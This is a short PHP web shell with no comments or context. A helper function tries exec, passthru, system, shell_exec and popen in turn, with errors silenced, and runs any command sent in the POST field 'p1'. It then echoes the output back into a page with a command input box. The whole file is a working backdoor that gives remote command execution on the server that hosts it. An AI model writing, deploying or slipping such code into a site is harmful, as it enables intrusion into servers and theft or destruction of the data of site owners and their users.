<?php 
function ex($in) { 
    $out = ''; 
    if(function_exists('exec')) { 
        @exec($in,$out); 
        $out = @join("\n",$out); 
    }elseif(function_exists('passthru')) { 
        ob_start(); 
        @passthru($in); 
        $out = ob_get_clean(); 
    }elseif(function_exists('system')) { 
        ob_start(); 
        @system($in); 
        $out = ob_get_clean(); 
    }elseif(function_exists('shell_exec')) { 
        $out = shell_exec($in); 
    }elseif(is_resource($f = @popen($in,"r"))) { 
        $out = ""; 
        while(!@feof($f)) 
            $out .= fread($f,1024); 
        pclose($f); 
    } 
    return $out; 
} 



if(!empty($_POST['p1'])) { 
    echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1'])); 
} 

echo '</form></div><script>document.cf.cmd.focus();</script>'; 

?>